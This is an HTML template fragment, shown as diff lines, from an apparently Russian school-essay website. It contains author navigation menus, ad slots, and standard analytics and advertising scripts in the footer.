+ <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- vsesoch 520 x 200 в верху -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:520px;height:200px"
+     data-ad-client="ca-pub-3061159945061509"
+     data-ad-slot="6403641704"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<!-- mod_php version 1.0.0.Alpha1-J1.5/ -->
+		</div>
+	
+		</div>
+		<!-- END: BANNER -->
+		
+	</div>
+	</div>
+	<!-- END: CONTENT -->
+
+		<!-- BEGIN: COLUMNS -->
+	<div id="ja-colwrap">
+
+				<div id="ja-col1">
+					<div class="moduletable">
+					
+<!-- /mod_php version 1.0.0.Alpha1-J1.5 (c) www.fijiwebdesign.com -->
+ <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- vsesoch адаптивный справа в верху -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-3061159945061509"
+     data-ad-slot="4838106106"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<!-- mod_php version 1.0.0.Alpha1-J1.5/ -->
+		</div>
+			<div class="moduletable">
+					<h3>Свободная тема</h3>
+					<ul class="menu"><li class="item84"><a href="/vremena-goda.html"><span>Времена года</span></a></li><li class="item83"><a href="/sochineniya-po-kartinam.html"><span>Сочинения по картинам</span></a></li><li class="item97"><a href="/sochineniya-na-raznuyu-temu.html"><span>Сочинения на разную тему</span></a></li><li class="item85"><a href="/sochineniya-5-klass.html"><span>Сочинения 5 класс</span></a></li><li class="item86"><a href="/sochineniya-6-klass.html"><span>Сочинения 6 класс</span></a></li><li class="item87"><a href="/sochineniya-7-klass.html"><span>Сочинения 7 класс</span></a></li><li class="item88"><a href="/sochineniya-8-klass.html"><span>Сочинения 8 класс</span></a></li><li class="item89"><a href="/sochineniya-9-klass.html"><span>Сочинения 9 класс</span></a></li><li class="item90"><a href="/sochineniya-10-klass.html"><span>Сочинения 10 класс</span></a></li></ul>		</div>
+			<div class="moduletable">
+					<h3>Древнерусская</h3>
+					<ul class="menu"><li class="item93"><a href="/zhitie-prepodobnoe.html"><span>Житие преподобное</span></a></li><li class="item92"><a href="/povest-o-petre-i-fevronii-muromskix.html"><span>Повесть о Петре и Февронии Муромских</span></a></li><li class="item4"><a href="/slovo-o-polku-igoreve.html"><span>Слово о полку Игореве</span></a></li></ul>		</div>
+			<div class="moduletable">
+					
+<!-- /mod_php version 1.0.0.Alpha1-J1.5 (c) www.fijiwebdesign.com -->
+ <div id='bn_3be57affdb'>загрузка...</div>
+<script type='text/javascript' src='http://recreativ.ru/rcode.3be57affdb.js'></script>
+
+
+
+<!-- mod_php version 1.0.0.Alpha1-J1.5/ -->
+		</div>
+			<div class="moduletable">
+					<h3>Зарубежная</h3>
+					<ul class="menu"><li class="item127"><a href="/dzhonatan-svift.html"><span>Джонатан Свифт</span></a></li><li class="item99"><a href="/valter-skott.html"><span>Вальтер Скотт</span></a></li><li class="item101"><a href="/dzhejms-oldridzh.html"><span>Джеймс Олдридж</span></a></li><li class="item102"><a href="/dzhek-london.html"><span>Джек Лондон</span></a></li><li class="item105"><a href="/dzhordzh-bajron.html"><span>Джордж Байрон</span></a></li><li class="item103"><a href="/iogann-gyote.html"><span>Иоганн Гёте</span></a></li><li class="item95"><a href="/o-genri.html"><span>О. Генри</span></a></li><li class="item94"><a href="/prosper-merime.html"><span>Проспер Мериме</span></a></li><li class="item104"><a href="/robert-berns.html"><span>Роберт Бернс</span></a></li><li class="item100"><a href="/edgar-po.html"><span>Эдгар По</span></a></li><li class="item116"><a href="/viktor-gyugo.html"><span>Виктор Гюго</span></a></li><li class="item119"><a href="/lope-de-vega.html"><span>Лопе де Вега</span></a></li><li class="item123"><a href="/dante-aligeri.html"><span>Данте Алигьери</span></a></li><li class="item124"><a href="/omar-xayam.html"><span>Омар Хаям</span></a></li><li class="item125"><a href="/antuan-de-sent-ekzyuperi.html"><span>Антуан де Сент-Экзюпери</span></a></li><li class="item128"><a href="/genrix-ibsen.html"><span>Генрих Ибсен</span></a></li><li class="item129"><a href="/oldos-xaksli.html"><span>Олдос Хаксли</span></a></li><li class="item130"><a href="/dzherom-k-dzherom.html"><span>Джером К. Джером</span></a></li><li class="item131"><a href="/stendal.html"><span>Стендаль</span></a></li><li class="item132"><a href="/f-kafka.html"><span>Ф. Кафка</span></a></li><li class="item133"><a href="/dzhon-e-stejnbek.html"><span>Джон Э. Стейнбек</span></a></li><li class="item134"><a href="/g-flober.html"><span>Г. Флобер</span></a></li><li class="item135"><a href="/ernest-xeminguej.html"><span>Эрнест Хемингуей</span></a></li><li class="item136"><a href="/brem-stoker.html"><span>Брэм Стокер</span></a></li><li class="item137"><a href="/zhan-batist-moler.html"><span>Жан Батист Мольер</span></a></li><li class="item138"><a href="/emil-zolya.html"><span>Эмиль Золя</span></a></li><li class="item139"><a href="/gi-de-mopassan.html"><span>Ги де Мопассан</span></a></li><li class="item140"><a href="/federiko-garsiya-lorka.html"><span>Федерико Гарсия Лорка</span></a></li><li class="item164"><a href="/artur-konan-dojl.html"><span>Артур Конан Дойл</span></a></li><li class="item166"><a href="/u-shekspir.html"><span>У. Шекспир</span></a></li><li class="item167"><a href="/bernard-shou.html"><span>Бернард Шоу</span></a></li><li class="item168"><a href="/onore-de-balzak.html"><span>Оноре де Бальзак</span></a></li></ul>		</div>
+			<div class="moduletable">
+					<h3>Украинская литература</h3>
+					<ul class="menu"><li class="item117"><a href="/genrk-bsen.html"><span>Генрік Ібсен</span></a></li><li class="item118"><a href="/fkafka.html"><span>Ф.Кафка</span></a></li><li class="item120"><a href="/ese.html"><span>Есе</span></a></li><li class="item126"><a href="/ese.html"><span>Твори на різну тему</span></a></li><li class="item141"><a href="/gofman.html"><span>Гофман</span></a></li><li class="item142"><a href="/t-g-shevchenko.html"><span>Т. Г. Шевченко</span></a></li><li class="item143"><a href="/lesya-ukranka.html"><span>Леся Українка</span></a></li><li class="item144"><a href="/-kocherga.html"><span>І. Кочерга</span></a></li><li class="item145"><a href="/karpenko-karij.html"><span>Карпенко Карий</span></a></li><li class="item146"><a href="/o-kobilyanska.html"><span>О. Кобилянська</span></a></li><li class="item147"><a href="/van-bagryanij.html"><span>Іван Багряний</span></a></li><li class="item151"><a href="/van-nechuj-leviczkij.html"><span>Іван Нечуй-Левицький</span></a></li><li class="item155"><a href="/mikola-gogol.html"><span>Микола Гоголь</span></a></li><li class="item156"><a href="/van-kotlyarevskij.html"><span>Іван Котляревський</span></a></li><li class="item157"><a href="/boris-grnchenko.html"><span>Борис Грінченко</span></a></li><li class="item158"><a href="/oleksandr-dovzhenko.html"><span>Олександр Довженко</span></a></li><li class="item159"><a href="/grigorj-skovoroda.html"><span>Григорій Сковорода</span></a></li><li class="item160"><a href="/oleksa-storozhenko.html"><span>Олекса Стороженко</span></a></li><li class="item161"><a href="/osip-turyanskij.html"><span>Осип Турянський</span></a></li><li class="item162"><a href="/onore-de-balzak.html"><span>Оноре де Бальзак</span></a></li><li class="item165"><a href="/volodimir-vinnichenko.html"><span>Володимир Винниченко</span></a></li></ul>		</div>
+	
+		</div>
+		
+				<div id="ja-col2">
+					<div class="moduletable">
+					<h3>Классическая</h3>
+					<ul class="menu"><li class="item71"><a href="/ln-andreev.html"><span>Л.Н. Андреев</span></a></li><li class="item113"><a href="/i-f-annenskij.html"><span>И. Ф. Анненский</span></a></li><li class="item27"><a href="/a-a-axmatova.html"><span>А. А. Ахматова</span></a></li><li class="item74"><a href="/ie-babel.html"><span>И.Э. Бабель</span></a></li><li class="item28"><a href="/p-p-bazhov.html"><span>П. П. Бажов</span></a></li><li class="item112"><a href="/k-d-balmont.html"><span>К. Д. Бальмонт</span></a></li><li class="item114"><a href="/e-a-baratynskij.html"><span>Е. А. Баратынский</span></a></li><li class="item69"><a href="/kn-batyushkov.html"><span>К.Н. Батюшков</span></a></li><li class="item29"><a href="/v-g-belinskij.html"><span>В. Г. Белинский</span></a></li><li class="item30"><a href="/a-a-blok.html"><span>А. А. Блок</span></a></li><li class="item31"><a href="/m-a-bulgakov.html"><span>М. А. Булгаков</span></a></li><li class="item32"><a href="/i-a-bunin.html"><span>И. А. Бунин</span></a></li><li class="item154"><a href="/zn-gippius.html"><span>З.Н. Гиппиус</span></a></li><li class="item33"><a href="/a-i-gerczen.html"><span>А. И. Герцен</span></a></li><li class="item34"><a href="/n-v-gogol.html"><span>Н. В. Гоголь</span></a></li><li class="item35"><a href="/i-a-goncharov.html"><span>И. А. Гончаров</span></a></li><li class="item36"><a href="/a-m-gorkij.html"><span>А. М. Горький</span></a></li><li class="item37"><a href="/a-s-griboedov.html"><span>А. С. Грибоедов</span></a></li><li class="item75"><a href="/as-grin.html"><span>А.С. Грин</span></a></li><li class="item38"><a href="/n-s-gumilev.html"><span>Н. С. Гумилев</span></a></li><li class="item39"><a href="/g-r-derzhavin.html"><span>Г. Р. Державин</span></a></li><li class="item40"><a href="/f-m-dostoevskij.html"><span>Ф. М. Достоевский</span></a></li><li class="item41"><a href="/s-a-esenin.html"><span>С. А. Есенин</span></a></li><li class="item42"><a href="/v-a-zhukovskij.html"><span>В. А. Жуковский</span></a></li><li class="item43"><a href="/e-i-zamyatin.html"><span>Е. И. Замятин</span></a></li><li class="item76"><a href="/mm-zoshhenko.html"><span>М.М. Зощенко</span></a></li><li class="item44"><a href="/n-m-karamzin.html"><span>Н. М. Карамзин</span></a></li><li class="item73"><a href="/vg-korolenko.html"><span>В.Г. Короленко</span></a></li><li class="item45"><a href="/i-a-krylov.html"><span>И. А. Крылов</span></a></li><li class="item46"><a href="/a-i-kuprin.html"><span>А. И. Куприн</span></a></li><li class="item47"><a href="/m-yu-lermontov.html"><span>М. Ю. Лермонтов</span></a></li><li class="item48"><a href="/n-s-leskov.html"><span>Н. С. Лесков</span></a></li><li class="item49"><a href="/m-v-lomonosov.html"><span>М. В. Ломоносов</span></a></li><li class="item68"><a href="/as-makarenko.html"><span>А.С. Макаренко</span></a></li><li class="item50"><a href="/v-v-mayakovskij.html"><span>В. В. Маяковский</span></a></li><li class="item70"><a href="/vv-nabokov.html"><span>В.В. Набоков</span></a></li><li class="item51"><a href="/n-a-nekrasov.html"><span>Н. А. Некрасов</span></a></li><li class="item52"><a href="/a-n-ostrovskij.html"><span>А. Н. Островский</span></a></li><li class="item53"><a href="/b-l-pasternak.html"><span>Б. Л. Пастернак</span></a></li><li class="item54"><a href="/a-p-platonov.html"><span>А. П. Платонов</span></a></li><li class="item55"><a href="/m-m-prishvin.html"><span>М. М. Пришвин</span></a></li><li class="item56"><a href="/a-s-pushkin.html"><span>А. С. Пушкин</span></a></li><li class="item148"><a href="/k-f-ryleev.html"><span>К. Ф. Рылеев</span></a></li><li class="item57"><a href="/a-n-radishhev.html"><span>А. Н. Радищев</span></a></li><li class="item58"><a href="/m-e-saltykov-shhedrin.html"><span>М. Е. Салтыков-Щедрин</span></a></li><li class="item67"><a href="/ap-sumarokov.html"><span>А.П. Сумароков</span></a></li><li class="item72"><a href="/a-n-tolstoj.html"><span>А. Н. Толстой</span></a></li><li class="item59"><a href="/l-n-tolstoj.html"><span>Л. Н. Толстой</span></a></li><li class="item60"><a href="/i-s-turgenev.html"><span>И. С. Тургенев</span></a></li><li class="item61"><a href="/f-i-tyutchev.html"><span>Ф. И. Тютчев</span></a></li><li class="item62"><a href="/a-a-fet.html"><span>А. А. Фет</span></a></li><li class="item63"><a href="/d-i-fonvizin.html"><span>Д. И. Фонвизин</span></a></li><li class="item64"><a href="/n-g-chernyshevskij.html"><span>Н. Г. Чернышевский</span></a></li><li class="item65"><a href="/a-p-chexov.html"><span>А. П. Чехов</span></a></li><li class="item96"><a href="/e-l-shvarcz.html"><span>Е. Л. Шварц</span></a></li><li class="item66"><a href="/m-a-sholoxov.html"><span>М. А. Шолохов</span></a></li></ul>		</div>
+			<div class="moduletable">
+					<h3>Современная</h3>
+					<ul class="menu"><li class="item81"><a href="/fa-abramov.html"><span>Ф.А. Абрамов</span></a></li><li class="item111"><a href="/a-m-adamovich.html"><span>А. М. Адамович</span></a></li><li class="item13"><a href="/ch-t-ajtmatov.html"><span>Ч. Т. Айтматов</span></a></li><li class="item110"><a href="/a-g-aleksin.html"><span>А. Г. Алексин</span></a></li><li class="item5"><a href="/v-p-astafev.html"><span>В. П. Астафьев</span></a></li><li class="item79"><a href="/ag-bitov.html"><span>А.Г. Битов</span></a></li><li class="item12"><a href="/yuv-bondarev.html"><span>Ю.В. Бондарев</span></a></li><li class="item11"><a href="/i-a-brodskij.html"><span>И. А. Бродский</span></a></li><li class="item106"><a href="/v-ya-bryusov.html"><span>В. Я. Брюсов</span></a></li><li class="item10"><a href="/v-v-bykov.html"><span>В. В. Быков</span></a></li><li class="item9"><a href="/a-v-vampilov.html"><span>А. В. Вампилов</span></a></li><li class="item8"><a href="/b-l-vasilev.html"><span>Б. Л. Васильев</span></a></li><li class="item7"><a href="/a-a-voznesenskij.html"><span>А. А. Вознесенский</span></a></li><li class="item82"><a href="/vs-vysoczkij.html"><span>В.С. Высоцкий</span></a></li><li class="item109"><a href="/v-s-grossman.html"><span>В. С. Гроссман</span></a></li><li class="item6"><a href="/v-d-dudinczev.html"><span>В. Д. Дудинцев</span></a></li><li class="item14"><a href="/e-a-evtushenko.html"><span>Е. А. Евтушенко</span></a></li><li class="item77"><a href="/na-zaboloczkij.html"><span>Н.А. Заболоцкий</span></a></li><li class="item78"><a href="/va-zakrutkin.html"><span>В.А. Закруткин</span></a></li><li class="item15"><a href="/a-a-kim.html"><span>А. А. Ким</span></a></li><li class="item16"><a href="/v-l-kondratev.html"><span>В. Л. Кондратьев</span></a></li><li class="item17"><a href="/b-a-mozhaev.html"><span>Б. А. Можаев</span></a></li><li class="item18"><a href="/b-sh-okudzhava.html"><span>Б. Ш. Окуджава</span></a></li><li class="item19"><a href="/k-g-paustovskij.html"><span>К. Г. Паустовский</span></a></li><li class="item20"><a href="/l-s-petrushevskaya.html"><span>Л. С. Петрушевская</span></a></li><li class="item80"><a href="/vg-rasputin.html"><span>В.Г. Распутин</span></a></li><li class="item21"><a href="/a-n-rybakov.html"><span>А. Н. Рыбаков</span></a></li><li class="item22"><a href="/k-m-simonov.html"><span>К. М. Симонов</span></a></li><li class="item23"><a href="/a-i-solzheniczyn.html"><span>А. И. Солженицын</span></a></li><li class="item24"><a href="/a-t-tvardovskij.html"><span>А. Т. Твардовский</span></a></li><li class="item25"><a href="/yuv-trifonov.html"><span>Ю.В. Трифонов</span></a></li><li class="item108"><a href="/a-a-fadeev.html"><span>А. А. Фадеев</span></a></li><li class="item107"><a href="/m-czvetaeva.html"><span>М. Цветаева</span></a></li><li class="item26"><a href="/v-m-shukshin.html"><span>В. М. Шукшин</span></a></li><li class="item115"><a href="/v-i-belov.html"><span>В. И. Белов</span></a></li><li class="item121"><a href="/sd-narinyani.html"><span>С.Д. Нариньяни</span></a></li><li class="item122"><a href="/eg-kazakevich.html"><span>Э.Г. Казакевич</span></a></li><li class="item152"><a href="/i-v-lotarev.html"><span>И. В. Лотарев</span></a></li><li class="item153"><a href="/o-e-mandelshtam.html"><span>О. Э. Мандельштам</span></a></li></ul>		</div>
+	
+		</div>
+		
+
+	</div><br />
+	<!-- END: COLUMNS -->
+	
+</div></div></div></div></div></div>
+
+</div>
+
+<!-- BEGIN: FOOTER -->
+<div id="ja-footerwrap">
+<div id="ja-footer" class="clearfix">
+
+	<div class="copyright">
+		
+		
+	</div>
+
+	<div class="ja-cert">
+		
+
+	</div>
+
+</div>
+</div>
+<!-- END: FOOTER -->
+
+</div>
+</div>
+
+
+
+
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='//counter.yadro.ru/hit?t22.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet: показано число просмотров за 24"+
+" часа, посетителей за 24 часа и за сегодня' "+
+"border='0' width='88' height='31'><\/a>")
+//--></script><!--/LiveInternet-->
+<script type="text/javascript" src="http://big-lib.com/template/api.js"></script>
+<!--Rating@Mail.ru counter-->
+<a target="_top" href="http://top.mail.ru/jump?from=2099213">
+<img src="http://d8.c0.b0.a2.top.mail.ru/counter?id=2099213;t=52"
+border="0" height="31" width="88" alt="Рейтинг@Mail.ru"></a>
+<!--// Rating@Mail.ru counter--></p>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter14031931 = new Ya.Metrika({id:14031931, enableAll: true, webvisor:true});
+        } catch(e) {}
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="//mc.yandex.ru/watch/14031931" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+<script type="text/javascript">var PC_CId = 55970;</script>
+<script type="text/javascript" src="http://st.pc.adonweb.ru/js/adv_out.js"></script>
+<script type="text/javascript">var PC_CId = 55971;</script>
+<script type="text/javascript" src="http://st.pc.adonweb.ru/js/adv_out.js"></script>
+</noindex>
+
+</body>
+
+</html>
